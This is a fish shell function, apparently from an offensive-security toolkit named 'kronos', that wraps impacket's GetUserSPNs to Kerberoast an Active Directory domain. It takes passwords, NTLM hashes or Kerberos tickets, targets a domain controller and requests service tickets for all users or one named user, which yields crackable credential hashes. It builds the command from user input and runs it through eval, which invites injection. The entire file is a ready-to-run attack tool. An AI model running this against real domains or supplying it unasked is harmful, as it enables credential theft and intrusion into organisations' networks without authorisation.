# description: Run Kerberoasting using impacket-GetUserSPNs
function _kronos_kerbroast --description "Run Kerberoasting using impacket-GetUserSPNs"
    argparse h/help u/username= p/password= H/hash= d/domain= t/target= k/kerberos -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos kerbroast [DC_IP] [OPTIONS]"
        echo ""
        echo "Run Kerberoasting using impacket-GetUserSPNs."
        echo ""
        echo "Arguments:"
        echo "  DC_IP               DC IP, hostname, or nameserver (falls back to \$TGT_DC or \$TGT)"
        echo ""
        echo "Options:"
        echo "  -u, --username USER Provide username for authentication"
        echo "  -p, --password PASS Provide password for authentication"
        echo "  -H, --hash HASH     Provide NTLM hash for authentication"
        echo "  -d, --domain DOMAIN Target domain (falls back to \$TGT_AD_DOMAIN)"
        echo "  -t, --target USER   Only roast this specific user (defaults to all users)"
        echo "  -k, --kerberos      Use Kerberos authentication (requires KRB5CCNAME)"
        echo "  -h, --help          Show this help message"
        return 0
    end

    set -l target $argv[1]
    if test -z "$target"
        if test -n "$TGT_DC"
            set target $TGT_DC
        else if test -n "$TGT"
            set target $TGT
        else
            echo "Error: Target IP/hostname/nameserver is required." >&2
            echo "Usage: kronos kerbroast [TARGET] [OPTIONS]" >&2
            return 1
        end
    end

    set -l domain ""
    if set -q _flag_domain
        set domain $_flag_domain
    else if test -n "$TGT_AD_DOMAIN"
        set domain $TGT_AD_DOMAIN
    else
        echo "Error: Domain is required. Provide it via -d/--domain or ensure TGT_AD_DOMAIN is set." >&2
        return 1
    end

    set -l auth_user ""
    set -l auth_pass ""
    set -l auth_hash ""
    set -l has_creds 0

    if set -q _flag_kerberos
        set has_creds 1
    else if set -q _flag_username
        set auth_user $_flag_username
        if set -q _flag_password
            set auth_pass $_flag_password
            set has_creds 1
        else if set -q _flag_hash
            set auth_hash $_flag_hash
            set has_creds 1
        else
            echo "Error: Username provided but no password (-p) or hash (-H) supplied." >&2
            return 1
        end
    else if test -n "$TGT_USERNAME"
        if test -n "$TGT_PASSWORD"
            set auth_user $TGT_USERNAME
            set auth_pass $TGT_PASSWORD
            set has_creds 1
        else if test -n "$TGT_HASH"
            set auth_user $TGT_USERNAME
            set auth_hash $TGT_HASH
            set has_creds 1
        end
    end

    if test "$has_creds" -eq 0
        echo "Error: Credentials or Kerberos flag are required." >&2
        return 1
    end

    set -l impacket_cmd ""
    if command -s GetUserSPNs.py >/dev/null
        set impacket_cmd "GetUserSPNs.py"
    else if command -s impacket-GetUserSPNs >/dev/null
        set impacket_cmd "impacket-GetUserSPNs"
    else
        echo "Error: GetUserSPNs.py or impacket-GetUserSPNs not found in PATH." >&2
        return 1
    end

    set -l cmd_str "$impacket_cmd \"$domain/$auth_user"
    if set -q _flag_kerberos
        set cmd_str "$cmd_str\" -k"
    else if test -n "$auth_hash"
        set cmd_str "$cmd_str\" -hashes \"$auth_hash\""
    else
        set cmd_str "$cmd_str:$auth_pass\""
    end
    set cmd_str "$cmd_str -dc-ip \"$target\""

    if set -q _flag_target
        echo "Running impacket-GetUserSPNs against $target to Kerberoast user $_flag_target..."
        set cmd_str "$cmd_str -request-user \"$_flag_target\""
    else
        echo "Running impacket-GetUserSPNs against $target to Kerberoast all users..."
        set cmd_str "$cmd_str -request"
    end

    eval $cmd_str
end
